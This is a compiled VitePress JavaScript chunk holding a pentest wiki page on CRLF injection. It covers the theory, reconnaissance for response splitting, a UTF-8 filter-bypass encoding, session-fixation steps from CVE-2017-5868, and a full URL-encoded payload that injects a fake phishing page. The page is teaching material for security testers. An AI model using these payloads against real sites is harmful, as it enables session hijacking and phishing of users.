import{_ as t,c as a,a5 as n,o as s}from"./chunks/framework.B5CpDqM0.js";const g=JSON.parse('{"title":"üõ†Ô∏è CRLF injection","description":"","frontmatter":{"authors":"KenjiEndo15, ShutdownRepo"},"headers":[],"relativePath":"web/inputs/crlf-injection.md","filePath":"web/inputs/crlf-injection.md","lastUpdated":1724982529000}'),i={name:"web/inputs/crlf-injection.md"};function r(o,e,l,c,p,h){return s(),a("div",null,e[0]||(e[0]=[n(`<h1 id="üõ†Ô∏è-crlf-injection" tabindex="-1">üõ†Ô∏è CRLF injection <a class="header-anchor" href="#üõ†Ô∏è-crlf-injection" aria-label="Permalink to &quot;üõ†Ô∏è CRLF injection&quot;">‚Äã</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">‚Äã</a></h2><p>CRLF represents termination of line:</p><ul><li>CR = Carriage Return (<code>\\r</code>)</li><li>LF = Line Feed (<code>\\n</code>)</li></ul><p>Windows and the protocol HTTP uses the CRLF however, Linux doesn&#39;t (it only uses LF). The CRLF injection is a type of attack where an attacker injects a termination of line into an application (via HTTP or URL) to provoke other types of vulnerability (HTTP Response Splitting, Log Injection...).</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">‚Äã</a></h2><h3 id="http-response-splitting" tabindex="-1">HTTP Response Splitting <a class="header-anchor" href="#http-response-splitting" aria-label="Permalink to &quot;HTTP Response Splitting&quot;">‚Äã</a></h3><h4 id="reconnaissance" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance" aria-label="Permalink to &quot;Reconnaissance&quot;">‚Äã</a></h4><p>Important: before even considering a CRLF injection, testers have to find any data that is sent in a request and reflected in the response (that follows the previous request). <br> An example by <a href="https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/http_response_splitting_vulnerability.html" target="_blank" rel="noreferrer">SecureFlag</a> considers an application that in case of error (<code>/?error=Page+Not+found</code>), redirects the user using the <code>Location</code> HTTP header while reflecting the value of the <code>error</code> parameter:</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Response (due to an application error)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">HTTP/1.1</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 301</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Moved</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Permanently</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /index?error=Page+Not+Found</span></span></code></pre></div><p>From cases similar to this one, testers have to find a place where CRLF injection is possible, such as:</p><ul><li>URL: <code>https://example.com/&lt;CRLF_injection&gt;</code></li><li>Query parameter: <code>https://example.com/lang=en&lt;CRFL_injection&gt;</code></li></ul><p>Upon using a CRLF injection, testers can inject arbitrary HTTP headers.</p><p>Filter bypass: one can <a href="https://blog.innerht.ml/twitter-crlf-injection/" target="_blank" rel="noreferrer">bypass filters</a> using UTF-8 encoding</p><ul><li>CRLF = %E5%98%8A%E5%98%8D</li></ul><h4 id="session-fixation" tabindex="-1">Session fixation <a class="header-anchor" href="#session-fixation" aria-label="Permalink to &quot;Session fixation&quot;">‚Äã</a></h4><p>A good example of session fixation (with CRLF injection) comes from the CVE-2017-5868 and is explained in this <a href="https://sysdream.com/news/lab/2017-05-05-cve-2017-5868-openvpn-access-server-crlf-injection-with-session-fixation/" target="_blank" rel="noreferrer">post</a>.</p><ol><li>An attacker notice that the parameter <code>__session_start</code> in OpenVPN is vulnerable to CRLF injection.</li><li>The attacker crafts an URL by setting a cookie:</li></ol><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>https://example.com/__session_start__/&lt;CRLF_injection&gt;Set-Cookie:&lt;Cookie&gt;[...]</span></span></code></pre></div><ol start="3"><li>The attacker sends this crafted URL to a victim.</li><li>The victim opens the URL and authenticates itself. Once authenticated, the cookie will be associated with its session.</li><li>The attacker can now use the cookie with the fixed session to access the victim&#39;s profile.</li></ol><h4 id="cross-site-scripting-xss" tabindex="-1">Cross-Site Scripting (XSS) <a class="header-anchor" href="#cross-site-scripting-xss" aria-label="Permalink to &quot;Cross-Site Scripting (XSS)&quot;">‚Äã</a></h4><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection" target="_blank" rel="noreferrer">PayloadsAllTheThings</a> has an interesting payload to write a document, and therefore include an XSS.</p><p>Requested page:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E</span></span></code></pre></div><p>HTTP response:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Set-Cookie:en</span></span>
<span class="line"><span>Content-Length: 0</span></span>
<span class="line"><span>‚Äã</span></span>
<span class="line"><span>HTTP/1.1 200 OK</span></span>
<span class="line"><span>Content-Type: text/html</span></span>
<span class="line"><span>Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT</span></span>
<span class="line"><span>Content-Length: 34</span></span>
<span class="line"><span>‚Äã</span></span>
<span class="line"><span>&lt;html&gt;You have been Phished&lt;/html&gt;</span></span></code></pre></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">‚Äã</a></h2><p><a href="https://www.acunetix.com/websitesecurity/crlf-injection/" target="_blank" rel="noreferrer">https://www.acunetix.com/websitesecurity/crlf-injection/</a></p><p><a href="https://www.netsparker.com/blog/web-security/crlf-http-header/" target="_blank" rel="noreferrer">https://www.netsparker.com/blog/web-security/crlf-http-header/</a></p><p><a href="https://owasp.org/www-community/vulnerabilities/CRLF_Injection" target="_blank" rel="noreferrer">https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a></p><p><a href="https://www.srccodes.com/log-forging-by-crlf-log-injection-owasp-security-vulnerability-attacks-crlf//" target="_blank" rel="noreferrer">https://www.srccodes.com/log-forging-by-crlf-log-injection-owasp-security-vulnerability-attacks-crlf//</a></p><p><a href="https://sysdream.com/news/lab/2017-05-05-cve-2017-5868-openvpn-access-server-crlf-injection-with-session-fixation/" target="_blank" rel="noreferrer">https://sysdream.com/news/lab/2017-05-05-cve-2017-5868-openvpn-access-server-crlf-injection-with-session-fixation/</a></p><p><a href="https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/http_response_splitting_vulnerability.html" target="_blank" rel="noreferrer">https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/http_response_splitting_vulnerability.html</a></p><p><a href="https://blog.innerht.ml/overflow-trilogy/" target="_blank" rel="noreferrer">https://blog.innerht.ml/overflow-trilogy/</a></p><p><a href="https://blog.innerht.ml/twitter-crlf-injection/" target="_blank" rel="noreferrer">https://blog.innerht.ml/twitter-crlf-injection/</a></p><p><a href="https://www.geeksforgeeks.org/crlf-injection-attack/" target="_blank" rel="noreferrer">https://www.geeksforgeeks.org/crlf-injection-attack/</a></p>`,36)]))}const u=t(i,[["render",r]]);export{g as __pageData,u as default};
